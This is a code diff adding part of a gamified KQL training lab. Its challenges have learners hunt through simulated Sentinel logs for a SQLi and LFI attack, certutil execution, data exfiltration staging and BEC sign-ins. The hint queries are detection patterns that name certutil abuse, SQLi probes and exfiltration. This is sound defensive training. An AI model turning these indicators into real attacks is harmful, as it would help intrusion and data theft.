+                task: `From <strong>W3CIISLog</strong>, compute:<br>• <code>AttackRequests = countif(cIP == "203.0.113.50")</code><br>• <code>FailedRequests = countif(scStatus >= 400)</code><br>• <code>UniqueAttackerIPs = dcountif(cIP, scStatus >= 400)</code><br>• <code>P95_ResponseTime = percentile(TimeTaken, 95)</code><br>• <code>P50_ResponseTime = percentile(TimeTaken, 50)</code>`,
+                hint: `<code>W3CIISLog<br>| summarize <br>    AttackRequests = countif(cIP == "203.0.113.50"),<br>    FailedRequests = countif(scStatus >= 400),<br>    UniqueAttackerIPs = dcountif(cIP, scStatus >= 400),<br>    P95_ResponseTime = percentile(TimeTaken, 95),<br>    P50_ResponseTime = percentile(TimeTaken, 50)</code>`,
+                validation: `Should show a single summary row with: AttackRequests=2 (or similar, the two 203.0.113.50 requests), FailedRequests showing count of 4xx/5xx responses, UniqueAttackerIPs showing count of distinct attacking IPs with errors, P95 and P50 response times as numbers.`,
+                xp: 260
+            },
+
+            {
+                id: 26, chain: 6, stage: "Advanced KQL", title: "Attack Timeline Buckets", difficulty: "Medium",
+                commands: ["bin()", "ago()", "summarize"],
+                tables: ["DeviceProcessEvents"],
+                scenario: `Create a time-bucketed histogram of all process executions to identify the attack surge period visually. This is the data behind a timechart.`,
+                task: `From <strong>DeviceProcessEvents</strong> where <code>TimeGenerated >= ago(90d)</code>:<br>Summarize <code>count()</code> by <code>bin(TimeGenerated, 1d)</code> and <code>DeviceName</code>. Sort by TimeGenerated. Filter to only include <code>DeviceName == "WS-9991"</code> to highlight the attack spike.`,
+                hint: `<code>DeviceProcessEvents<br>| where TimeGenerated >= ago(90d)<br>| where DeviceName == "WS-9991"<br>| summarize Events = count() by bin(TimeGenerated, 1d), DeviceName<br>| sort by TimeGenerated asc</code>`,
+                validation: `Should show daily buckets for WS-9991. The attack day (around 2026-04-19) should show a spike of 2+ events. Other days should show 0 or 1. Results should have TimeGenerated (binned to day), DeviceName=WS-9991, Events columns.`,
+                xp: 180
+            },
+
+            {
+                id: 27, chain: 6, stage: "Advanced KQL", title: "Render the Attack", difficulty: "Medium",
+                commands: ["render"],
+                tables: ["SigninLogs"],
+                scenario: `Visualize signin events over time as a timechart to spot the attack spike — this is what analysts use in Sentinel workbooks.`,
+                task: `From <strong>SigninLogs</strong>, summarize <code>count()</code> by <code>bin(TimeGenerated, 1d)</code> and then <code>render timechart</code>. Also try <code>render barchart</code>. Report what you observe — on which day is the spike? Note: paste the tabular data that feeds the chart.`,
+                hint: `<code>SigninLogs<br>| summarize SigninCount = count() by bin(TimeGenerated, 1d)<br>| sort by TimeGenerated asc<br>| render timechart</code><br><br>The chart visual can't be pasted — paste the tabular data rows instead, or describe the spike day.`,
+                validation: `User should paste tabular rows showing daily signin counts. At least one row should show a date in April 2026 with the attack activity. Results should have TimeGenerated (binned) and a count column. Accept tabular data OR a description of the spike day.`,
+                xp: 160
+            },
+
+            {
+                id: 28, chain: 6, stage: "Advanced KQL", title: "Range Generator", difficulty: "Hard",
+                commands: ["range()", "extend", "join leftouter"],
+                tables: ["SigninLogs"],
+                scenario: `Sometimes there are gaps in logs — zero events in certain hours. Use range() to generate a complete time series and left-join it with actual log data to find quiet periods.`,
+                task: `Use <code>range</code> to generate a series of dates from <code>datetime(2026-04-10)</code> to <code>datetime(2026-04-15)</code> in <code>1d</code> steps. Then <code>left outer join</code> this with the daily signin count from <strong>SigninLogs</strong>. Fill missing counts with 0 using <code>coalesce()</code>.`,
+                hint: `<code>range TimeSlot from datetime(2026-04-10) to datetime(2026-04-15) step 1d<br>| join kind=leftouter (<br>    SigninLogs<br>    | where TimeGenerated between (datetime(2026-04-10) .. datetime(2026-04-15))<br>    | summarize SigninCount = count() by bin(TimeGenerated, 1d)<br>) on $left.TimeSlot == $right.TimeGenerated<br>| extend SigninCount = coalesce(SigninCount, 0)<br>| project TimeSlot, SigninCount</code>`,
+                validation: `Should show 6 rows (one per day, Apr 10-15). Most days should have SigninCount=0 or a small number. April 13 should show elevated count due to BEC activity. The range fills in days with no events (showing 0). TimeSlot column plus SigninCount column.`,
+                xp: 260
+            },
+
+            {
+                id: 29, chain: 6, stage: "Advanced KQL", title: "Materialize for Performance", difficulty: "Hard",
+                commands: ["materialize()", "let", "join inner"],
+                tables: ["DeviceProcessEvents", "DeviceNetworkEvents"],
+                scenario: `When you reference a filtered dataset multiple times in a query, materialize() caches it for performance. Practice this optimization pattern on the attack data.`,
+                task: `Use <code>let</code> + <code>materialize()</code> to cache <strong>DeviceProcessEvents</strong> filtered to <code>DeviceName == "WS-9991"</code>. Then reference this materialized variable TWICE — once to count total events, once to join with <strong>DeviceNetworkEvents</strong> for WS-9991. Show both results.`,
+                hint: `<code>let ws9991procs = materialize(<br>    DeviceProcessEvents | where DeviceName == "WS-9991"<br>);<br>let procCount = ws9991procs | summarize TotalProcs = count();<br>let joinedNet = ws9991procs<br>    | join kind=inner (<br>        DeviceNetworkEvents | where DeviceName == "WS-9991"<br>    ) on DeviceName<br>    | project FileName, ProcessCommandLine, RemoteIP, BytesSent;<br>union procCount, joinedNet</code>`,
+                validation: `Should show two result sets combined: first, a count of WS-9991 processes (TotalProcs should be 2), then joined rows showing process + network correlation with RemoteIP=45.33.12.12 and certutil in ProcessCommandLine. materialize is referenced twice.`,
+                xp: 280
+            },
+
+            {
+                id: 30, chain: 6, stage: "Advanced KQL", title: "Sequential Attack — scan Operator", difficulty: "Hard",
+                commands: ["scan"],
+                tables: ["W3CIISLog"],
+                scenario: `The attack on web-iis-01 followed a specific pattern: first a SQLi probe (HTTP 500), then a successful LFI (HTTP 200) — both from 203.0.113.50. Use the scan operator to detect this exact sequence.`,
+                task: `Use the <code>scan</code> operator on <strong>W3CIISLog</strong> sorted by TimeGenerated to detect the sequential pattern: first a row with <code>scStatus == 500</code> from <code>cIP == "203.0.113.50"</code>, then a row with <code>scStatus == 200</code> from the same IP. Label each step.`,
+                hint: `<code>W3CIISLog<br>| where cIP == "203.0.113.50"<br>| sort by TimeGenerated asc<br>| scan with (<br>    step s1: scStatus == 500 => Phase = "SQLi Probe";<br>    step s2: scStatus == 200 => Phase = "LFI Success";<br>)<br>| project TimeGenerated, cIP, csUriQuery, scStatus, Phase</code>`,
+                validation: `Should show 2 rows labeled with Phase. Row 1: scStatus=500, Phase=SQLi Probe, csUriQuery containing '1'='1'. Row 2: scStatus=200, Phase=LFI Success, csUriQuery containing win.ini. The scan operator assigns the state labels.`,
+                xp: 300
+            },
+
+            {
+                id: 31, chain: 6, stage: "Advanced KQL", title: "Per-Device partition Analysis", difficulty: "Hard",
+                commands: ["partition"],
+                tables: ["DeviceProcessEvents"],
+                scenario: `The partition operator runs a subquery independently for each partition key — perfect for per-device top process analysis at scale without skewing results across devices.`,
+                task: `Use the <code>partition</code> operator on <strong>DeviceProcessEvents</strong> partitioned by <code>DeviceName</code>. Inside the partition, get the <code>top 2</code> most frequent <code>FileName</code> values per device. This gives you each device's "top processes" independently.`,
+                hint: `<code>DeviceProcessEvents<br>| partition by DeviceName<br>(<br>    summarize ExecCount = count() by FileName<br>    | top 2 by ExecCount<br>)<br>| sort by DeviceName, ExecCount desc</code>`,
+                validation: `Should show multiple devices each with up to 2 rows (their top 2 processes). WS-9991 should appear with certutil.exe or cmd.exe. Each device's results are independent — the top 2 is per-device, not global. Columns: DeviceName, FileName, ExecCount.`,
+                xp: 300
+            },
+
+            {
+                id: 32, chain: 6, stage: "Advanced KQL", title: "Grand Finale — Full Attack Timeline", difficulty: "Hard",
+                commands: ["union", "let", "summarize", "sort/order by", "format_datetime()", "project-rename"],
+                tables: ["SigninLogs", "AuditLogs", "DeviceProcessEvents", "DeviceFileEvents", "W3CIISLog", "CommonSecurityLog"],
+                scenario: `Build the complete cross-chain attack timeline as the final deliverable for executive reporting. This is your capstone — combining everything you've learned.`,
+                task: `Using <code>let</code> and <code>union</code>, create a unified timeline with entries from ALL 5 attack chains:<br>• Chain 1: BEC signin from 185.220.101.45<br>• Chain 2: certutil execution on WS-9991<br>• Chain 3: Exfil_Data.zip creation<br>• Chain 4: sp-automation-99 listKeys action<br>• Chain 5: SQLi from 203.0.113.50<br>For each: include TimeGenerated, Chain, Stage, Actor, Activity columns. Sort by time. Use <code>format_datetime()</code> for readable timestamps and <code>project-rename</code> to standardize column names.`,
+                hint: `<code>let c1 = SigninLogs | where IPAddress == "185.220.101.45" | extend Chain="BEC", Stage="Initial Access", Actor=UserPrincipalName, Activity="Malicious Signin";<br>let c2 = DeviceProcessEvents | where ProcessCommandLine contains "certutil" | extend Chain="Ransomware", Stage="Execution", Actor=DeviceName, Activity=ProcessCommandLine;<br>let c3 = DeviceFileEvents | where FileName contains "Exfil" | extend Chain="Insider", Stage="Staging", Actor=DeviceName, Activity=FileName;<br>let c4 = AuditLogs | where OperationName == "Add user" and tostring(TargetResources) contains "svc-backup-admin" | extend Chain="AzureMisconfig", Stage="Persistence", Actor=tostring(InitiatedBy), Activity=OperationName;<br>let c5 = W3CIISLog | where cIP == "203.0.113.50" | extend Chain="WebAttack", Stage="Initial Access", Actor=cIP, Activity=csUriQuery;<br>union c1, c2, c3, c4, c5<br>| project TimeGenerated, Chain, Stage, Actor, Activity<br>| extend TimeFormatted = format_datetime(TimeGenerated, "yyyy-MM-dd HH:mm:ss")<br>| project-rename AttackChain=Chain, AttackStage=Stage<br>| sort by TimeGenerated asc</code>`,
+                validation: `Should show a unified timeline with 5+ rows from different attack chains. Columns: TimeGenerated (or TimeFormatted), AttackChain (renamed from Chain), AttackStage (renamed from Stage), Actor, Activity. At minimum: one BEC row, one certutil row, one Exfil_Data row, one Add user or listKeys row, one SQLi row. Sorted by time.`,
+                xp: 400
+            }
+        ];
+
+        // ============================================================
+        // APP STATE
+        // ============================================================
+        let apiKey = "";
+        let currentChallengeIdx = 0;
+        let score = 0;
+        let correctCount = 0;
+        let skippedCount = 0;
+        let completedIds = new Set();
+        let skippedIds = new Set();
+        let commandsDone = new Set();
+        let hintShown = false;
+        let chainCompletedIds = new Set(JSON.parse(localStorage.getItem("kql_chains_done") || "[]"));
+        let soundEnabled = localStorage.getItem("kql_sound") !== "false";
+        let attemptCount = 0;
+
+        // ============================================================
+        // STARTUP
+        // ============================================================
+        function startLab() {
+            const key = document.getElementById("apiKeyInput").value.trim();
+            if (!key) { alert("Please enter your Groq API key to proceed."); return; }
+            apiKey = key;
+            localStorage.setItem("kql_groq_key", key);
+            document.getElementById("apiModal").style.display = "none";
+            document.getElementById("app").style.display = "grid";
+            initKqlGrid();
+            loadFromStorage();
+            renderChallenge();
+        }
+
+        function loadFromStorage() {
+            const savedKey = localStorage.getItem("kql_groq_key");
+            if (savedKey) {
+                apiKey = savedKey;
+                document.getElementById("apiModal").style.display = "none";
+                document.getElementById("app").style.display = "grid";
+            }
+            try {
+                const saved = localStorage.getItem("kql_lab_v3");
+                if (saved) {
+                    const s = JSON.parse(saved);
+                    score = s.score || 0;
+                    correctCount = s.correct || 0;
+                    skippedCount = s.skipped || 0;
+                    completedIds = new Set(s.completed || []);
+                    skippedIds = new Set(s.skipped_ids || []);
+                    commandsDone = new Set(s.commands || []);
+                    // Find next uncompleted challenge
+                    let found = false;
+                    for (let i = 0; i < CHALLENGES.length; i++) {
+                        if (!completedIds.has(CHALLENGES[i].id) && !skippedIds.has(CHALLENGES[i].id)) {
+                            currentChallengeIdx = i; found = true; break;
+                        }
+                    }
+                    if (!found) currentChallengeIdx = CHALLENGES.length;
+                }
+            } catch (e) { }
+            updateHeader();
+        }
+
+        function saveToStorage() {
+            localStorage.setItem("kql_lab_v3", JSON.stringify({
+                score, correct: correctCount, skipped: skippedCount,
+                completed: [...completedIds], skipped_ids: [...skippedIds],
+                commands: [...commandsDone]
+            }));
+        }
+
+        // ============================================================
+        // RENDER
+        // ============================================================
+        function renderChallenge() {
+            if (currentChallengeIdx >= CHALLENGES.length) {
+                showEndScreen(); return;
+            }
+            const ch = CHALLENGES[currentChallengeIdx];
+            const chain = CHAINS[ch.chain];
+            hintShown = false;
+            attemptCount = 0;
+
+            const area = document.getElementById("challengeArea");
+            const stageColor = {
+                "Initial Access": "#00d4ff", "Execution": "#ffb520", "Persistence": "#ff8c00",
+                "Collection": "#a855f7", "Staging": "#a855f7", "Exfiltration": "#ff2b5e",
+                "C2 Communication": "#ff4500", "Lateral Movement": "#ff2b5e", "Impact": "#ff0000",
+                "Advanced KQL": "#888888"
+            }[ch.stage] || "#00d4ff";
+
+            const cmdChips = ch.commands.map(c => `<span class="cmd-chip">${c}</span>`).join("");
+            const tblChips = ch.tables.map(t => `<span class="table-chip">${t}</span>`).join("");
+            const iocCards = (chain.iocs || []).map(i => `<div class="ioc-card"><div class="ioc-type">${i.type}</div><div class="ioc-val">${i.val}</div></div>`).join("");
+
+            const donePct = Math.round((completedIds.size / CHALLENGES.length) * 100);
+
+            const statusBadge = completedIds.has(ch.id) 
+                ? `<span style="background:rgba(0,255,136,0.15);border:1px solid var(--green);color:var(--green);font-size:11px;padding:3px 10px;border-radius:20px;margin-left:8px">✅ Completed</span>`
+                : skippedIds.has(ch.id)
+                ? `<span style="background:rgba(255,181,32,0.1);border:1px solid var(--amber);color:var(--amber);font-size:11px;padding:3px 10px;border-radius:20px;margin-left:8px">⏭ Skipped</span>`
+                : "";
+
+            area.innerHTML = `
+    <div class="chain-header" style="border-color:${chain.color}20;background:linear-gradient(135deg,${chain.color}08,transparent)">
+      <div class="chain-icon">${chain.icon}</div>
+      <div>
+        <div class="chain-name" style="color:${chain.color}">${chain.name}</div>
+        <div class="chain-desc">${chain.desc}</div>
+      </div>
+      <div class="chain-progress-mini">
+        <div class="cpm-val" style="color:${chain.color}">${donePct}%</div>
+        <div class="cpm-lbl">Complete</div>
+      </div>
+    </div>
+    ${iocCards.length ? `<div class="ioc-grid">${iocCards}</div>` : ""}
+    <div class="challenge-card active" id="activeCard">
+      <div class="card-header">
+        <span class="ch-num">CHALLENGE ${ch.id} / ${CHALLENGES.length}${statusBadge}</span>
+        <span class="stage-badge" style="background:${stageColor}18;color:${stageColor};border:1px solid ${stageColor}40">${ch.stage}</span>
+        <span class="diff-badge diff-${ch.difficulty.toLowerCase()}">${ch.difficulty}</span>
+        <span style="margin-left:auto;font-family:var(--font-head);font-size:12px;color:var(--amber)">+${ch.xp} XP</span>
+        <div class="card-title">${ch.title}</div>
+      </div>
+      <div class="card-body">
+        <div class="scenario-box">${ch.scenario}</div>
+        <div class="task-box">
+          <div class="task-label">🎯 Your Task</div>
+          <div class="task-text">${ch.task}</div>
+        </div>
+        <div class="tables-row"><span class="tables-label">Tables:</span>${tblChips}</div>
+        <div class="cmds-row"><span class="cmds-label">Commands:</span>${cmdChips}</div>
+        
+        <div class="editor-label">✏️ Write Your KQL Query</div>
+        <div id="kqlEditorWrap" style="border:1px solid #243857;border-radius:8px;overflow:hidden;min-height:100px;margin-bottom:16px"></div>
+        
+        <div class="editor-label result-label">📋 Paste Your ADX Result</div>
+        <textarea class="result-area" id="resultArea" placeholder="Paste your query result from Azure Data Explorer here...
+You can paste as table text, TSV, or JSON format.
+Even partial results are fine — Groq will validate them."></textarea>
+        
+        <div class="hint-box" id="hintBox">
+          <div class="hint-title">💡 Hint</div>
+          <div>${ch.hint}</div>
+        </div>
+        
+        <div class="actions">
+          <button class="btn btn-skip" onclick="prevChallenge()" ${currentChallengeIdx === 0 ? 'disabled' : ''}>← Prev</button>
+          <button class="btn btn-primary" id="submitBtn" onclick="submitAnswer()">⚡ Validate Answer</button>
+          <button class="btn btn-hint" onclick="toggleHint()">💡 Hint</button>
+          <button class="btn btn-skip" onclick="skipChallenge()">⏭ Skip</button>
+          <button class="btn btn-skip" onclick="goNextRaw()">Next →</button>
+          <button class="btn btn-skip" style="color:var(--red);border-color:rgba(255,43,94,0.3)" onclick="resetCurrentChallenge()">↺ Reset</button>
+          <span style="margin-left:auto;color:var(--text2);font-size:12px;font-family:var(--font-mono)">Run in ADX → paste result → validate</span>
+        </div>
+        
+        <div class="feedback" id="feedbackBox"></div>
+      </div>
+    </div>`;
+
+            updateHeader();
+            updateKqlGrid();
+
+            let kqlEditor = CodeMirror(document.getElementById("kqlEditorWrap"), {
+                value: `// Write your KQL here, run in ADX, paste result below\n${ch.tables[0]}\n| where `,
+                mode: "text/x-sql",
+                theme: "dracula",
+                lineNumbers: true,
+                lineWrapping: true,
+                autofocus: true,
+                extraKeys: { "Tab": cm => cm.replaceSelection("    ") }
+            });
+            kqlEditor.setSize("100%", "140px");
+            window._kqlEditor = kqlEditor;
+
+            updateJumpDropdown();
+        }
+
+        // ============================================================
+        // VALIDATION
+        // ============================================================
+        async function submitAnswer() {
+            const result = document.getElementById("resultArea").value.trim();
+            const kql = window._kqlEditor ? window._kqlEditor.getValue().trim() : "";
+            if (!result) {
+                showFeedback("loading", "⚠️ Please paste your ADX result first before validating!", "");
+                return;
+            }
+
+            const ch = CHALLENGES[currentChallengeIdx];
+            const btn = document.getElementById("submitBtn");
+            btn.disabled = true;
+            btn.innerHTML = '<div class="spinner"></div> Validating...';
+
+            showFeedback("loading", '<div class="spinner"></div> Groq is analyzing your answer...', "");
+
+            const prompt = `You are a KQL (Kusto Query Language) training validator for Microsoft Sentinel / Azure Data Explorer.
+
+CHALLENGE #${ch.id}: "${ch.title}"
+ATTACK STAGE: ${ch.stage}
+DIFFICULTY: ${ch.difficulty}
+KQL COMMANDS TO PRACTICE: ${ch.commands.join(", ")}
+
+THE TASK:
+${ch.task.replace(/<[^>]+>/g, '').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&')}
+
+WHAT TO VALIDATE:
+${ch.validation}
+
+USER'S KQL QUERY:
+${kql || "(not provided)"}
+
+USER'S PASTED RESULT:
+${result || "(not provided — validating based on query only)"}
+
+VALIDATION RULES:
+1. The user ran a real KQL query in Azure Data Explorer and pasted the result
+2. ADX results come in many formats — tab-separated, spaced columns, partial rows, truncated — ALL are valid
+3. You are checking INTENT and KEY EVIDENCE, not exact formatting or exact column names
+4. A correct answer means: the user's KQL logic is right AND the result contains at least 2-3 of the expected key values
+5. Do NOT reject because of missing columns, extra columns, different column order, or formatting differences
+6. Do NOT reject because the result is truncated or shows only a few rows
+7. If the KQL query itself is logically correct for the task, lean toward correct:true even if result looks unusual
+8. Only mark correct:false if the result is clearly gibberish, completely empty with no explanation, or the KQL uses completely wrong tables/operators
+9. If the user shows they understood the concept even partially — mark correct:true with explanation
+10. Be a supportive senior SOC analyst reviewing a junior analyst's work, not a strict exam grader
+11. The "score" field must always be exactly 100 if correct, 0 if wrong. No other values.
+
+Respond ONLY with valid JSON (no markdown code fences), in this exact format:
+{"correct":true,"score":100,"explanation":"...","hint":"...","keyFindings":"..."}
+
+Where:
+- correct: true if substantially correct
+- score: 100 if correct, 0 if wrong
+- explanation: 2-3 sentences of what's right/wrong
+- hint: if wrong, a specific KQL hint (not the full solution)
+- keyFindings: what the correct result should show (1-2 sentences)`;
+
+            try {
+                const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Authorization": `Bearer ${apiKey}`
+                    },
+                    body: JSON.stringify({
+                        model: "llama-3.3-70b-versatile",
+                        messages: [{ role: "user", content: prompt }],
+                        response_format: { type: "json_object" }
+                    })
+                });
+
+                if (!response.ok) {
+                    const err = await response.json();
+                    throw new Error(err.error?.message || `HTTP ${response.status}`);
+                }
+
+                const data = await response.json();
+                let text = data.choices[0].message.content.trim();
+                const jsonMatch = text.match(/\{[\s\S]*\}/);
+                if (!jsonMatch) throw new Error("No valid JSON found in AI response.");
+                text = jsonMatch[0];
+                const parsed = JSON.parse(text);
+
+                if (parsed.correct) {
+                    const isNew = !completedIds.has(ch.id);
+                    if (isNew) {
+                        const xpEarned = ch.xp;
+                        completedIds.add(ch.id);
+                        score += ch.xp;
+                        correctCount++;
+                        ch.commands.forEach(c => commandsDone.add(c));
+                        saveToStorage();
+                        updateHeader();
+                        spawnXP(xpEarned);
+                        checkChainCompletion(ch.chain);
+                    }
+                    playSuccess();
+
+                    showFeedback("correct",
+                        `<div class="feedback-icon">✅</div><div class="feedback-msg"><strong>Correct!</strong> ${parsed.explanation}</div>` +
+                        (parsed.keyFindings ? `<div class="feedback-hint">📊 ${parsed.keyFindings}</div>` : ""),
+                        "");
+
+                    document.getElementById("submitBtn").style.display = "none";
+                    const actions = document.querySelector(".actions");
+                    const nextBtn = document.createElement("button");
+                    nextBtn.className = "btn btn-next";
+                    nextBtn.innerHTML = "→ Next Challenge";
+                    nextBtn.onclick = nextChallenge;
+                    actions.prepend(nextBtn);
+                } else {
+                    playError();
+                    attemptCount++;
+                    let fallbackBtn = attemptCount >= 2 ? `<br><button class="btn" style="background:rgba(255,181,32,0.1);border:1px solid var(--amber);color:var(--amber);margin-top:12px;font-size:12px" onclick="selfCertify()">✋ I got it right — Mark Correct</button>` : "";
+                    showFeedback("wrong",
+                        `<div class="feedback-icon">❌</div><div class="feedback-msg">${parsed.explanation}</div>` +
+                        (parsed.hint ? `<div class="feedback-hint">💡 ${parsed.hint}</div>` : "") + fallbackBtn,
+                        "");
+                    btn.disabled = false;
+                    btn.innerHTML = "⚡ Validate Answer";
+                }
+            } catch (e) {
+                attemptCount++;
+                let fallbackBtn = attemptCount >= 2 ? `<br><button class="btn" style="background:rgba(255,181,32,0.1);border:1px solid var(--amber);color:var(--amber);margin-top:12px;font-size:12px" onclick="selfCertify()">✋ I got it right — Mark Correct</button>` : "";
+                showFeedback("wrong", `<div class="feedback-icon">⚠️</div><div class="feedback-msg">Validation error: ${e.message}<br>Check your API key or try again.</div>` + fallbackBtn, "");
+                btn.disabled = false;
+                btn.innerHTML = "⚡ Validate Answer";
+            }
+        }
+
+        function showFeedback(type, html, extra) {
+            const fb = document.getElementById("feedbackBox");
+            fb.className = `feedback ${type}`;
+            fb.innerHTML = html + extra;
+            fb.style.display = "block";
+            fb.scrollIntoView({ behavior: "smooth", block: "nearest" });
+        }
+
+        function toggleHint() {
+            const box = document.getElementById("hintBox");
+            if (!hintShown) {
+                box.style.display = "block";
+                hintShown = true;
+            } else {
+                box.style.display = "none";
+                hintShown = false;
+            }
+        }
+
+        function skipChallenge() {
+            const ch = CHALLENGES[currentChallengeIdx];
+            if (!completedIds.has(ch.id)) {
+                skippedIds.add(ch.id);
+                skippedCount++;
+            }
+            saveToStorage();
+            nextChallenge();
+        }
+
+        function nextChallenge() {
+            // Find next not-completed not-skipped challenge
+            let found = false;
+            for (let i = currentChallengeIdx + 1; i < CHALLENGES.length; i++) {
+                if (!completedIds.has(CHALLENGES[i].id)) {
+                    currentChallengeIdx = i; found = true; break;
+                }
+            }
+            if (!found) {
+                // Check if any skipped ones remain
+                for (let i = 0; i < CHALLENGES.length; i++) {
+                    if (!completedIds.has(CHALLENGES[i].id)) {
+                        currentChallengeIdx = i; found = true; break;
+                    }
+                }
+            }
+            if (!found) { showEndScreen(); return; }
+            renderChallenge();
+            window.scrollTo(0, 0);
+        }
+
+        function jumpToChain(chainId) {
+            for (let i = 0; i < CHALLENGES.length; i++) {
+                if (CHALLENGES[i].chain === chainId && !completedIds.has(CHALLENGES[i].id)) {
+                    currentChallengeIdx = i;
+                    renderChallenge();
+                    document.getElementById("main").scrollTo(0, 0);
+                    return;
+                }
+            }
+            // If all done in this chain, go to first of that chain
+            for (let i = 0; i < CHALLENGES.length; i++) {
+                if (CHALLENGES[i].chain === chainId) {
+                    currentChallengeIdx = i;
+                    renderChallenge();
+                    document.getElementById("main").scrollTo(0, 0);
+                    return;
+                }
+            }
+        }
+
+        // ============================================================
+        // UI HELPERS
+        // ============================================================
+        function updateHeader() {
+            const total = CHALLENGES.length;
+            const done = completedIds.size;
+            const pct = Math.round((done / total) * 100);
+            document.getElementById("progLabel").textContent = `Challenge ${done} / ${total}`;
+            document.getElementById("progPct").textContent = `${pct}%`;
+            document.getElementById("progressFill").style.width = pct + "%";
+            document.getElementById("scoreVal").textContent = score.toLocaleString();
+            document.getElementById("correctVal").textContent = correctCount;
+            document.getElementById("skippedVal").textContent = skippedCount;
+            updateJumpDropdown();
+        }
+
+        function initKqlGrid() {
+            const grid = document.getElementById("kqlGrid");
+            grid.innerHTML = ALL_COMMANDS.map(c =>
+                `<span class="kql-tag" id="kql_${c.replace(/[^a-z0-9]/gi, '_')}">${c}</span>`
+            ).join("");
+        }
+
+        function updateKqlGrid() {
+            const ch = CHALLENGES[currentChallengeIdx];
+            document.querySelectorAll(".kql-tag").forEach(el => {
+                const cmd = el.textContent;
+                if (commandsDone.has(cmd)) {
+                    el.className = "kql-tag done";
+                } else if (ch && ch.commands.includes(cmd)) {
+                    el.className = "kql-tag current";
+                } else {
+                    el.className = "kql-tag";
+                }
+            });
+        }
+
+        function spawnXP(amount) {
+            const el = document.createElement("div");
+            el.className = "xp-popup";
+            el.textContent = `+${amount} XP`;
+            el.style.cssText = `left:${Math.random() * 60 + 20}%;top:${Math.random() * 30 + 30}%`;
+            document.body.appendChild(el);
+            setTimeout(() => el.remove(), 1500);
+        }
+
+        function showEndScreen() {
+            document.getElementById("challengeArea").innerHTML = "";
+            const end = document.getElementById("endScreen");
+            end.style.display = "block";
+
+            const cmdsArr = [...commandsDone];
+            document.getElementById("endStats").innerHTML = `
+    <div class="end-stat"><div class="end-stat-val" style="color:var(--cyan)">${score.toLocaleString()}</div><div class="end-stat-lbl">Total XP</div></div>
+    <div class="end-stat"><div class="end-stat-val" style="color:var(--green)">${correctCount}</div><div class="end-stat-lbl">Correct</div></div>
+    <div class="end-stat"><div class="end-stat-val" style="color:var(--amber)">${skippedCount}</div><div class="end-stat-lbl">Skipped</div></div>
+    <div class="end-stat"><div class="end-stat-val" style="color:var(--purple)">${cmdsArr.length}</div><div class="end-stat-lbl">Commands Mastered</div></div>
+  `;
+
+            document.getElementById("endCmds").innerHTML = ALL_COMMANDS.map(c =>
+                `<span class="kql-tag ${commandsDone.has(c) ? 'done' : ''}">${c}</span>`
+            ).join("");
+        }
+
+        function restartLab() {
+            localStorage.removeItem("kql_lab_v3");
+            score = 0; correctCount = 0; skippedCount = 0;
+            completedIds = new Set(); skippedIds = new Set(); commandsDone = new Set();
+            currentChallengeIdx = 0;
+            document.getElementById("endScreen").style.display = "none";
+            updateHeader(); updateKqlGrid(); renderChallenge();
+        }
+
+        function editApiKey() {
+            const newKey = prompt("Enter new Groq API Key:", apiKey ? "gsk_..." : "");
+            if (newKey && newKey.trim()) {
+                apiKey = newKey.trim();
+                localStorage.setItem("kql_groq_key", apiKey);
+                alert("✅ API key updated!");
+            }
+        }
+
+        function selfCertify() {
+            if (!confirm("Mark this challenge as correct yourself? Only use this if validation is wrong.")) return;
+            const ch = CHALLENGES[currentChallengeIdx];
+            const isNew = !completedIds.has(ch.id);
+            if (isNew) {
+                const xpEarned = ch.xp;
+                completedIds.add(ch.id);
+                score += ch.xp;
+                correctCount++;
+                ch.commands.forEach(c => commandsDone.add(c));
+                saveToStorage();
+                updateHeader();
+                spawnXP(xpEarned);
+                checkChainCompletion(ch.chain);
+            }
+            playSuccess();
+            showFeedback("correct", 
+                `<div class="feedback-icon">✅</div><div class="feedback-msg"><strong>Self-certified correct!</strong> Challenge marked complete.</div>`,
+                "");
+            document.getElementById("submitBtn").style.display = "none";
+            const actions = document.querySelector(".actions");
+            const nextBtn = document.createElement("button");
+            nextBtn.className = "btn btn-next";
+            nextBtn.innerHTML = "→ Next Challenge";
+            nextBtn.onclick = nextChallenge;
+            actions.prepend(nextBtn);
+        }
+
+        function prevChallenge() {
+            if (currentChallengeIdx > 0) {
+                currentChallengeIdx--;
+                renderChallenge();
+                document.getElementById("main").scrollTo(0, 0);
+            }
+        }
+
+        function goNextRaw() {
+            if (currentChallengeIdx < CHALLENGES.length - 1) {
+                currentChallengeIdx++;
+                renderChallenge();
+                document.getElementById("main").scrollTo(0, 0);
+            }
+        }
+
+        function resetCurrentChallenge() {
+            const ch = CHALLENGES[currentChallengeIdx];
+            if (!confirm(`Reset challenge #${ch.id} "${ch.title}"? This removes it from completed and deducts ${ch.xp} XP.`)) return;
+            if (completedIds.has(ch.id)) {
+                completedIds.delete(ch.id);
+                score = Math.max(0, score - ch.xp);
+                correctCount = Math.max(0, correctCount - 1);
+                ch.commands.forEach(c => commandsDone.delete(c));
+            }
+            skippedIds.delete(ch.id);
+            saveToStorage();
+            updateHeader();
+            renderChallenge();
+        }
+
+        function resetAllProgress() {
+            if (!confirm("Reset ALL progress? This clears all XP, correct answers, and completed challenges.")) return;
+            localStorage.removeItem("kql_lab_v3");
+            score = 0; correctCount = 0; skippedCount = 0;
+            completedIds = new Set(); skippedIds = new Set(); commandsDone = new Set();
+            currentChallengeIdx = 0;
+            saveToStorage();
+            updateHeader();
+            updateKqlGrid();
+            renderChallenge();
+        }
+
+        function jumpToChallenge(idx) {
+            currentChallengeIdx = parseInt(idx);
+            renderChallenge();
+            document.getElementById("main").scrollTo(0, 0);
+        }
+
+        function updateJumpDropdown() {
+            const sel = document.getElementById("challengeJump");
+            if (!sel) return;
+            sel.innerHTML = CHALLENGES.map((ch, i) => {
+                const prefix = completedIds.has(ch.id) ? "✅" : skippedIds.has(ch.id) ? "⏭" : "🔒";
+                return `<option value="${i}" ${i === currentChallengeIdx ? "selected" : ""}>${prefix} #${ch.id} — ${ch.title} (${ch.difficulty})</option>`;
+            }).join("");
+        }
+
+        function toggleSound() {
+            soundEnabled = !soundEnabled;
+            localStorage.setItem("kql_sound", soundEnabled);
+            const btn = document.getElementById("soundToggle");
+            if (btn) btn.textContent = soundEnabled ? "🔊" : "🔇";
+        }
+
+        function playSuccess() {
+            if (!soundEnabled) return;
+            const ctx = new AudioContext();
+            [523, 659, 784, 1047].forEach((freq, i) => {
